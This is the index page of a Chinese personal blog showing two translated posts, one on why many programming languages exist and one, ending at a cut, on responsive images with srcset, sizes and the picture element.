
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>主页</title>
    
    <script src="/assets/themes/bootstrap-3/bootstrap/js/jquery.min.js"></script>
    <meta name="author" content="Jinyi Xie">

    <!-- Enable responsive viewport -->
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <!-- Bootstrap styles -->
    <link href="/assets/themes/bootstrap-3/bootstrap/css/bootstrap.min.css" rel="stylesheet" defer async="true">
    <!-- Optional theme -->
    <link href="/assets/themes/bootstrap-3/bootstrap/css/bootstrap-theme.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="/assets/themes/bootstrap-3/pygments.css">
    
    <!-- Custom styles -->
    <link href="/assets/themes/bootstrap-3/css/style.css?body=1" rel="stylesheet" type="text/css" media="all">

    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <!-- atom & rss feed -->
    <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">

  </head>

  <body>
    <div id="wrap">
      <nav class="navbar navbar-default navbar-inverse" role="navigation">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#jb-navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/">hsfzxjy</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="jb-navbar-collapse">
          <ul class="nav navbar-nav">
            
            
            


  
    
      
      	
      	<li><a href="/archieve.html">归档</a></li>
      	
      
    
  
    
      
    
  
    
      
      	
      	<li><a href="/categories.html">分类</a></li>
      	
      
    
  
    
  
    
      
      	
      	<li><a href="/pages.html">页面</a></li>
      	
      
    
  
    
      
    
  
    
      
    
  
    
      
      	
      	<li><a href="/tags.html">标签</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="/about/">联系我</a></li>
      	
      
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  



          </ul>
        </div><!-- /.navbar-collapse -->
      </nav>

      <div class="container" id="main-container">
        <a href="https://github.com/hsfzxjy" target="_blank" class="hidden-xs">
          <img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png">
        </a>
        
<div class="page-header">
  <h1 class="post-title">
         
         <small class="tagline">不忌讳空山无人，不害怕遥望星辰</small>
  </h1>
</div>

<div class="row">
  <div class="col-xs-12 post-content">
    
<link rel="stylesheet" type="text/css" href="/assets/themes//bootstrap-3/css/index.css?body=1">
<div class="posts">
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/why-are-so-many-programming-languages/">【译】“为什么有这么多的编程语言？”</a>
            </h1>
            <p class="time">18 Sep 2015</p>
        </header>
        <section class="content">
            <blockquote>
<p>原文链接：<a href="http://blog.stackoverflow.com/2015/07/why-are-there-so-many-programming-languages/">戳这里</a></p>
</blockquote>

<p>在过去的一周中，几位同事曾两次问了我这个问题。听起来，这像是一个糟糕的问题，但事实上并不是这样的。</p>

<p>最简短的答案就是：<strong>尽管我们并不需要这么多语言，但我们还是想要（want）它们</strong>。让我们再探索得更深一些吧。</p>

<h2>难道它们不都是一样的吗？</h2>

<p>某种意义上（In a sense），是的。创建一个网站，你可以使用 <code>Ruby</code>、<code>Java</code>、<code>Python</code>、<code>C#</code>、<code>Go</code> 抑或是 <code>Javascript</code>。甚至，你可以使用 <code>C</code> 或 <code>C++</code> 或 <code>Haskell</code> 或 <code>Rust</code> 或 <code>COBOL</code> 或 <code>Pascal</code> 或 <code>Perl</code>。</p>

<p>事实的背后就是：这些语言都有着同样的目的——把人类的思想转变成为计算机能够读懂的 1 和 0——用夸张的（highfalutin）的计算机术语来讲：它们都是 <a href="https://en.wikipedia.org/wiki/Turing_completeness">图灵完备（Turing complete）</a> 的。</p>

<p>从底层上来看，这些语言都<strong>是</strong>完全一样的。但从表面（人类和它们交互的接口）上来看，它们却有很大的不同。这，便是人们关注的焦点了。</p>

<h2>不同的任务需要不同的工具</h2>

<p>事实上，编程语言只是工具，而对于不同的任务，我们需要选择不同的工具。拖拉机（tractor trailer）、自行车、特斯拉汽车（Tesla）都是交通工具——它们都有轮子，有转向器（steering ?），并且都会将你从一个地方带到另一个地方——但显然，我们要将它们运用到不同的场景中。</p>

<p>编程语言也是类似的：若是要构建网站，<code>Ruby</code> 和 <code>Javascript</code> 是不错的选择；<code>Java</code> 和 <code>C++</code> 则常常被运用在金融领域；至于 <code>Python</code> 和 <code>R</code>，它们是统计分析的工具。</p>

<p>在语言的选择上，我们常常要从便捷程度、安全性和速度这几个方面进行权衡（trade-offs）——就像交通工具一样。通常来讲，需要根据手头上的工作视情况而定。</p>

<h2>开发者们有不同的“口味”（tastes）</h2>

<p>抛开纯粹的功能，开发者还会根据个人的“口味”来选择工具。</p>

<p>编程语言是人类向计算机<strong>表达</strong>想法的工具。尽管不同的开发者在许多方面都有相似之处，我们的思考方式仍存在着区别——这是自然所决定的。</p>

<p>由于有多种编程语言供我们选择，我们完全可以选择一种“以我们想要的方式工作”的语言。有的开发者喜欢<code>Ruby</code>的灵活性（flexibility），而另一些则喜欢<code>Java</code>的严谨（strictness）。同时，有些语言看上去和数学一样深奥，而另一些读起来却和散文一样（prose）。</p>

<h2>以人为本</h2>

<p>业务是以人为本的。</p>

<p>撇开功能和个人“口味”，通常来说，你会选择一种你了解的，或是你周围的人了解的语言。</p>

<p>Stack Overflow 选择了 <code>C#</code>，很大程度上是因为团队的创始人了解它。其次（In turn），它也是为创始人的朋友和同事所了解的。<code>C#</code> 使招聘工作（recruiting）变得更加简单，同时也使 Stack Overflow 更快地进入市场。</p>

<p>（幸运的是，<code>C#</code> 同时也有着超棒的技术亮点）</p>

<p>一种技术需要一个“生态圈”（ecosystem）来支持——那便是能为每个有需要的开发者提供工具和帮助的社区（communities）和组织（organizations）。好的“生态圈”能让个人开发者更加成功——<code>Ruby</code> 就是个很好的例子。</p>

<h2>多样性就是力量</h2>

<p>总的来说，由于我们有着各种各样的任务，同时也有着各种各样的人在完成这些任务，我们才有了各种各样的编程语言。</p>

<p>而正是这种多样性的存在，使得许多有趣的程序，有趣的公司甚至是有趣的职业生涯，从不可能成为了可能。</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#翻译-ref">
    		翻译 <span>2</span>
    	</a></li>
     
    	<li><a href="/categories.html#编程-ref">
    		编程 <span>36</span>
    	</a></li>
    
  


          </ul>
          

         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/the-state-of-responsive-images-in-2015/">【译】响应式图片的现状</a>
            </h1>
            <p class="time">18 Sep 2015</p>
        </header>
        <section class="content">
            <blockquote>
<p>原文链接：<a href="http://www.webdesignerdepot.com/2015/08/the-state-of-responsive-images/">戳这里</a></p>
</blockquote>

<p><img src="http://netdna.webdesignerdepot.com/uploads/2015/08/featured_images1.jpg" alt=""></p>

<p>Web 是一种可视化的媒体。如此壮阔的视觉效果，很大程度上要感谢图片文件所作出的贡献。虽然（Whilst）其中的许多效果都可以用 CSS 和 内联 SVG 来实现，互联网上的许多站点仍需要图片文件。</p>

<p>从去年的统计来看，每个站点中，图片平均占了一半的页面体积，并且随着时间的推移，图片体积有持续增加的趋势；就 2014 年而言，图片的大小便增长了 ** 21% **。</p>

<p>与此同时，互联网终端的种类、数量也在增长。从 72 ppi（市场份额正在下降）到 600 ppi，不同设备的分辨率（resolution）有着天壤之别。</p>

<p>创建能在任何设备中都有着高质量的图片，其实再容易不过了——用 1000 ppi 的质量保存图片，然后就可以不用再理他了（译者注：原文是 call it a day）。生成的图片，即使是在分辨率最高的设备上查看也是十分清晰的（crisp）。但是，在图片质量提升的同时，图片文件的大小也会相应地增加。要知道，<strong>页面加载时间</strong>可是影响用户体验的<strong>首要因素</strong>——因此，保证站点能够及时地呈现在用户面前是我们义不容辞（incrumbent）的责任。高质量的图片，即使是在宽带环境下加载也要耗费几十秒，更不用说（let alone）是移动端的设备了——简直就是无法使用。</p>

<p>响应式图片的目的，不是要为设备提供尽可能高质量的图片（这一点，我们很容易做到），而是要为设备提供它所能支持的最高质量的图片，仅此而已（nothing more）。</p>

<p>从这篇指南中，你将了解到响应式图片的工作原理（what works），响应式图片仍然存在的问题和陷阱（pitfall），以及如何将响应式图片运用到网站中。</p>

<h2>我能感受到这欲望，对速度的渴求</h2>

<p>为什么速度这么重要？难道还有人在用 3G 网络吗（译者注：歪果仁科技发达，早已看不起 3G 网络）？如果你的目标客户都住在曼哈顿市中心，为什么还要为莱索托的乡巴佬担心呢（译者注：南非山区）？ 事实上，“每个人都能用上超快的宽带，用上由那些利欲熏心的公司提供的宽带”——听起来就像个神话。</p>

<p>每个人每天都要耗费至少两个小时在恶劣的（inferior）网络环境中。就我而言，在挤公交上下班时（commuting），我常常会上网以打发无聊的时光——每当这时，稳定的 3G 网络听起来都像是遥不可及的美梦。</p>

<p>今年四月的时候，<a href="http://googlewebmastercentral.blogspot.co.uk/2015/04/rolling-out-mobile-friendly-update.html">Google 声称</a>“‘移动设备友好性’将会成为移动站点的排名因素“。甚至，在此之前，<a href="http://googlewebmastercentral.blogspot.co.uk/2011/03/introducing-page-speed-online-with.html">加载速度也是一个重要的排名因素</a>——无论是显式地体现在 Google 的统计中，抑或是隐式地成为影响网站跳出率（bounce rate）的一个重要因素。</p>

<p>对于两个相近的站点，1Kb 的冗余数据，都可能将你的 Google 排名从第三降到第四、第五，甚至是第十、第十一——换言之，从第一页降到了第二页——这会给你的收入（revenue）带来不小的冲击。</p>

<h2>你真的需要这图片吗？</h2>

<p>图片优化的最高境界便是：没有图片。你的站点上有五张图片，去掉一张，你便节省了 20%——或许更重要地，你节省了一次 HTTP 请求。如果你将五张图片都去掉了，那你就节省了 100%，以及所有的 HTTP 请求。因此，何乐而不为呢？</p>

<p>然而，我们并不会这么做——毕竟在短期内，图片比文字更有感染力。它们能和用户建立一种”感情通道“，从而使用户被站点的内容所吸引。</p>

<p>要知道，<a href="http://www.nngroup.com/articles/how-little-do-users-read/">用户从来不读网页</a>——只有极少数人会深入阅读站点上的内容。图片能让我们在很短的时间（a fraction of time）内了解一个品牌，深深地记住它（reinforce）——这是文字做不到的。</p>

<p>也许，图片的体积会很大，加载起来显得很笨重。然而一旦被浏览器渲染出来，和文字相比，它们能够更有力地抓住用户的眼球，更高效地传达品牌信息。</p>

<p>而响应式图片，就是为了更好地把握住这来之不易的”感情通道“，以防不耐烦的用户点击点击了”后退“按钮。</p>

<h2>那么，SVG 又怎么样呢？</h2>

<p>SVG（可缩放矢量图像）是 Web 发展史上的一大创举。它引领着潮流（ahead of the curve），至今大多数设计师依旧没有意识到其真正的潜力。</p>

<p>SVG ——正如它的名字所描述——是基于矢量的。这意味着 SVG 图像是由点、角和直线构成的。SVG 同时也是——正如它的名字所描述——是可缩放的，这意味着在 5k iMac 和 Android 智能手机上，它会表现得同样出色——没有质量的损失，也没有体积的差别。</p>

<p>如果你需要一张平面插图（flat illustration），一个图标，一个 logo 以及其他所有能够以 SVG 的形式显示出来的东西，SVG 是不二之选（the way to go）。</p>

<p>Web 上大多数图片都是位图。一般来说，位图的工作原理就是将每个像素点依次描述出来，包括它们的颜色（RGB 的形式，即 红、绿、蓝值），以及透明度（在某些场景下）。如果你有一张尺寸为 100px × 100px 的图片，那么它将有 10000 个像素点。如果每个像素点都用 4 个值来描述，那么这张图将等同于 40000 bits 的数据。听起来很多，不是吗？然而有时，它们的体积会比矢量图还要小。</p>

<p>考虑 1px × 1px 的图片，若使用位图，则需要 4 bits 来记录（红、绿、蓝，以及透明度）。现在考虑用矢量的形式来记录相同尺寸的图片：除了 RGBA 颜色值之外，还需要矩形的左上角坐标、长度和宽度这几个量。</p>

<p>这都是些极端的（crude）情况，但它们是准确的。通常，如果一幅图片的矢量版本——假使有的话——比同样的（equivalent）位图占用的体积还要多，那么位图是唯一合理的选择。</p>

<h2>（错误地）使用 Javascript</h2>

<p>正如生活中的许多问题（如果你的生活是在网络上的话），响应式图片也可以用 Javascript 来解决。事实上，在过去的许多年中，Javascript 是解决这个问题的唯一途径。通过对 User Agent 进行测试，Javascript 可以知道当前的浏览器类型，然后将指向合适的图片地址的 <code>image</code> 标签输出到页面上。</p>

<p>有些 Web 设计师反对这么做，理由是：<a href="https://gds.blog.gov.uk/2013/10/21/how-many-people-are-missing-out-on-javascript-enhancement/">有些人会关闭 Javascript 功能</a>。然而，这种情况已经非常少见了，尤其是在移动设备中。尽管如此，这种方法仍存在着一些问题——比如，这种图片不会被搜索引擎机器人解析出来，而且只有当脚本执行后图片才会被加载出来。</p>

<p>事实上，使用 Javascript 最大问题是：这是一种有悖于 Javascript 主要目的的使用方式。HTML 管理数据，CSS 处理表现形式，而 Javascript 负责功能实现。当我们违背了这些既定规则时，我们就会遇到各种各样的问题，遇到需要”奇技淫巧“（hack）来解决的问题。图片的本质是数据，因此应该交由 HTML 来处理。</p>

<h2>浏览器的问题</h2>

<p>从 RWD （响应式网页设计，Responsive Web Design）提出至今，图片都是最大的绊脚石（stumbling block）。然而现在，我们要开始寻找方法来解决这各种各样的问题了。能够被称为”最佳实践“的，都是那些久经沙场的（battle-hardened）、有足够成功案例的技术。专业的（dedicated）开发者已经牺牲了自己的时间去去游说（lobby） W3C，以求获得官方的解决方案。而现在，响应式图片第一次成为了可能。</p>

<p>响应式图片的关键，在于它充分地意识到了 Web 的失败之处。为保证响应式图片不会使浏览器崩溃，设计者们早已考虑得十分周到——即使对于不支持响应式图片的浏览器，代码也不会报错，而是向用户展示一张默认的、非响应式的图片。</p>

<p>在这篇文章中，我们将见到两个官方的响应式图片标签：<code>srcset</code> 以及 <code>picture</code>。</p>

<p>截至目前，Edge、Safari 和 iOS Safari 只支持 <code>srcset</code> 的一部分特性。Firefox、Chrome、Opera、Android 内置浏览器以及下一个版本的 Safari 和 iOS Safari 都将会完整地支持它。（我们会在下文讨论它们的区别）</p>

<p>而 <code>picture</code> 元素，已经被 Firefox、Chrome、Opera 以及 Android 内置浏览器完美支持。Edge、Safari 和 iOS Safari 则完全不支持，并且暂时也没有实现它们的打算。</p>

<p>由于不同厂商解析 W3C 特性的方法不同，即使是在兼容它们的浏览器中，也有一些不一致的地方。例如，当你使用 viewport 的大小来区分不同的设备时，有些浏览器会在 viewport 比小图片大 1px 时便将小图切换为大图，而另外一些则在 viewport 完全符合大图显示条件时才会这么做。</p>

<p>总之，浏览器可以分为两大阵营：想要图片质量尽可能高的 以及 想要图片体积尽可能小的。浏览器厂商都在各自推崇（duking）自己的主张，直到某一方的实现被大众所认可——个人而言我喜欢后者，因为它认为性能对用户体验而言更加关键。</p>

<p>至于现在，Web 设计人员的最佳选择就是：坚持 W3C 标准，而不要对浏览器作额外的猜测。毕竟，浏览器的默认体验（高质量 或是 高性能）是由用户选择的默认浏览器决定的——因此，如果用户意识到这其中的区别，那么用户的偏好就最有可能成为浏览器的偏好（译者注：这里怪怪的）。</p>

<h2>响应式图片最佳实践（2015）</h2>

<p>纵观 Web 的历史，我们曾经用一个标签来表示图片：<code>img</code> 标签。在 HTML5 中，<code>img</code> 的角色经历了（undergone）一些微妙（subtle）的变化——它被设计成响应式图片的开关，即其不再代表一张图片，而只是响应式图片的占位符。</p>

<p>这其中的区别十分重要。曾经，<code>img</code> 标签只能持有一副图片的数据（位图 或 矢量图）——而现在，它能持有多幅图的数据。</p>

<p><code>img</code>标签看起来是这样的（概括（recap）给非开发者）：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;&quot;</span> <span class="na">alt=</span><span class="s">&quot;&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p><code>img</code> 标签的响应式版本看起来是这样的：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;&quot;</span> <span class="na">src=</span><span class="s">&quot;&quot;</span> <span class="na">alt=</span><span class="s">&quot;&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>仅仅（Barely）只有一些区别而已。仔细看代码，你会注意到一件重要的事情：<strong>代码是向后兼容的</strong>。如果一个浏览器不能理解 <code>srcset</code> 属性，它会简单地忽略它，并按照 1993 年的原始标准进行渲染。</p>

<p>这意味着：我们能通过标记来使用响应式图片，而不需要对相关特性进行检测。</p>

<p>在新的响应式 <code>img</code> 标签中， 原则上 <code>src</code> 属性只是为不支持 <code>srcset</code> 的浏览器指定了默认的图片地址，而 <code>srcset</code> 属性则包含了用于适配各种分辨率的图片信息。</p>

<p>在渲染 <code>img</code> 标签是时，浏览器会自己决定出最适合的图片文件。</p>

<h2>使用 srcset</h2>

<p>既然我们已经知道 <code>srcset</code> 在不兼容的浏览器中会静默失败，我们便可以子有底增加图片了：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;image-b.jpg&quot;</span> <span class="na">src=</span><span class="s">&quot;image-a.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>在这个例子中，任何支持 <code>srcset</code> 的浏览器将会显示 <code>image-b.jpg</code>，而任何不支持的浏览器则会显示 <code>image-a.jpg</code>。</p>

<p>重要的是，你要知道浏览器只会下载它想要显示的图片，而并不会将所有图片都加载出来后再进行选择。</p>

<p>遗憾的是，我们并没有任何进步——除非我们是在展示 <code>srcset</code> 属性的使用，仅靠 <code>srcset</code> 的支持与否来加载图片并没有什么实际的应用。</p>

<p>解决方法就是：为浏览器提供更多的信息，让其知道自己该选择那一张图片。为了做到这一点，我们需要提供和图片的 像素密度（pixel density） 以及 可用空间（available space） 相关的信息。</p>

<h2>使用 x 描述符</h2>

<p>x 描述符能够让浏览器知道图片的像素密度。</p>

<p>举个例子，如果你想要提供一张两倍像素于标准图片的 视网膜级的（retina-grade）的图片，你需要在 <code>srcset</code> 中做出说明：在文件名后加上 <code>2x</code>。</p>

<p>这是我们的图片：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>为了给浏览器增添一个视网膜选项，我们将作出如下修改：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 2x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>在这个案例中，有三个可能的结果：</p>

<ol>
<li>如果浏览器不支持 <code>srcset</code>，则 <code>src</code> 所定义的图片将会被使用。</li>
<li>如果浏览器支持 <code>srcset</code> ，并且屏幕能够胜任两倍的分辨率，则 <code>srcset</code> 所定义的图片将会被采用</li>
<li>如果浏览器支持 <code>srcset</code>，但是没有足够高的分辨率，<code>src</code> 所定义的图片将会被采用（在 <code>srcset</code> 没有定义 <code>1x</code> 图片的情况下，<code>src</code> 属性会被视为这种情况下的选项）</li>
</ol>

<p>浏览器支持是良好的，并且在飞快地改进中。只用一个属性，我们就解决了响应式图片的难题（conundrum），真棒！</p>

<p>最后，关于 x 描述符，值得注意的是：图片的选择是基于像素密度的。故如果一个用户将浏览器缩放至 200%（等效于将图片大小减半，将像素密度加倍），2x 图片将会被加载。这会对 无障碍访问设备（accessibility）造成一些不利（detrimental）的影响——我们当然不希望在视力受损者访问网站时加载速度下降，而仅仅是因为他们缩放了网页。</p>

<h2>使用 w 描述符</h2>

<p>w 描述符比 x 描述符稍微先进一些。w 描述符的工作原理是：对于一个特定的图片选项，它会告诉浏览器 x 轴上的实际像素有多少（即宽度）。</p>

<p>截止写作时，Edge，Safari 以及 iOS Safari 尚不支持 w 描述符，这在某些程度上削弱了它的实用性。</p>

<p>让我们回到原来的图片：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>假设在本地时，这张图片的宽度是 1600 像素，现在我们想要新增一张视网膜级的图片。正如 x 描述符，我们将在 <code>srcset</code> 中定义宽为一张 3200 像素的图片：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 3200w&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>w 描述符最大的毛病（gotcha）就是：尽管在使用 x 描述符时， <code>src</code> 属性被视为默认选项，在支持 <code>srcset</code> 的浏览器上使用 w 描述符时它却会被忽略。在使用 w 描述符时，我们只能显示地定义默认图片：加上第二个 <code>srcset</code> 图片选项，用逗号分隔：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 3200w, image.jpg 1600w&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>导致有代码洁癖的我们要去使用……</p>

<h2>使用多幅图片</h2>

<p>能够在 HTML 代码中为浏览器提供高分辨率图片选项，确实很酷——然而，就像你所猜测的那样，当我们指定多幅图片时，事情会变得更酷。</p>

<p>响应式图片的目的，就是为了给不同的设备提供尽可能高质量的图片，而不要存在任何冗余。简单地提供一张高质量的图片还不够，我们需要提供更多的选择——比如 1x、1.5x、2x、2.5x 和 3x 的。</p>

<p>再回过头来，这是我们的原始定义：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>接下来，我们为浏览器提供了一个视网膜级的选项：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 2x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>而在这一次，我们会提供更多的额外选项，我们用逗号分隔它们：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;huge-image.jpg 3x, retina-image 2x, moderate-image 1.5x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>由于对于不同的人而言，关键字有着不同的意思，我建议根据 x 描述符来为图片命名，这样更有助于人脑的记忆，同时也更容易确定各个图片的尺寸以及让团队中的成员更加清楚：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;image_3x.jpg 3x, image_2x.jpg 2x, image_1-5.jpg 1.5x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>要记住：我们并没有告诉浏览器应该选择哪一幅图片，我们只是将可用的选项告诉了它，并允许它自行选择。浏览器只会下载其中的一副图片。</p>

<p>在使用多幅图片时有一个问题：永远不要为一幅图片定义两种描述符——举个例子：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;cross-the-streams.jpg 2x, cross-the-streams.jpg 3200w&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p><a href="https://www.youtube.com/watch?v=jyaLZHiJJnE">这会很不好</a>……</p>

<h2>使用 sizes</h2>

<p>除了定义格式，<code>sizes</code> 属性是相当有趣的，因为 <code>sizes</code> 属性的值是相对于 viewport 而言的，而不是图片本身。</p>

<p>使用 <code>vw</code> （viewport width），我们以相对于浏览器宽度的方式指定了图片区域——记住，<code>img</code> 标签现在只等效于一个占位符，因此我们不是在指定图片的实际尺寸，而是在指定包含图片的占位符的尺寸。</p>

<p><code>100v</code> 就是 100% 的 viewport 宽度， <code>50vw</code> 就是 50% 的 viewport 宽度，<code>25vw</code> 就是 25% 的 viewport 宽度……以此类推。</p>

<p>如果我们想让 <code>img</code> 的宽度达到浏览器宽度的一半，我们可以这样：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">sizes=</span><span class="s">&quot;50vw&quot;</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 2x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>这并不是特别有用，直到我们将它和 media query 结合起来……</p>

<h2>使用 media query</h2>

<p>当我们将 <code>sizes</code> 属性和 media query 相结合时，它会变得越来越强大。我们可以用逗号分隔多个 viewport 宽度，并通过 CSS 风格的 media query 告诉浏览器该使用哪一个。</p>

<p>举个例子，想象我们需要这么一张图片：在大多数的设备上它将占用 80% 的浏览器宽度，但在宽度小于等于  380px 的小尺寸设备（手机）上，我们想让它充满所有的空间（100% 的宽度）。我们应该这么写：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">sizes=</span><span class="s">&quot;(max-width: 380px) 100vw, 80vw&quot;</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 2x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>根据这个逻辑，任何视口宽度小于等于 380px 的浏览器会让图片充满 100% 的视口。其他的浏览器则会导致 media query 返回 <code>false</code>，从而采用另外的值——在这个例子中，即 <code>80vw</code>。</p>

<p>一般说来（As a general rule），我对在 HTML 使用 media query 表示十分反感。只是因为响应式图片数据是属于 HTML 的（不是 Javascript），而 media query 却是属于 CSS 的（不是 HTML）。但是，如果你需要，这也不失为一个选择。</p>

<h2>响应式图片的最佳实践（2016？）</h2>

<p>我不知道你是怎么想的，但我确实为 <code>srcset</code> 带来的改变感到兴奋。这是一个复杂问题的一个简单的解决方案，并且似乎提供了我们所需的所有东西。</p>

<p>但是，就像公交车一样，你为了响应式图片的官方解决方案等待了 20 年，而且一上场就有两个。除了 <code>img</code> 标签的 <code>srcset</code> 属性，我们还有 <code>picture</code> 标签。</p>

<p><code>picture</code> 标签是另外一种占位符——尽管（albeit）是较为传统的一种。它被设计为 HTML5 中 <code>audio</code> 和 <code>video</code> 标签的模仿者（mimic），因此，它的语法被大多数人所熟识。当你需要更多 <code>srcset</code> 不能提供的功能时，建议你使用 <code>picture</code>。</p>

<p>遗憾的是，<code>picture</code> 的浏览器支持比 <code>srcset</code> 更差，并且<strong>它不会静默失败</strong>。</p>

<h2>使用 picture</h2>

<p>这是图片的原始定义：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
</code></pre></div>
<p>这是一副嵌套在 <code>picture</code> 中的图片：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;picture&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/picture&gt;</span>
</code></pre></div>
<p>在 <code>picture</code> 标签中，我们也可以为 <code>img</code> 标签指定 <code>srcset</code> 属性：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;picture&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 2x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/picture&gt;</span>
</code></pre></div>
<h2>使用 source 标签</h2>

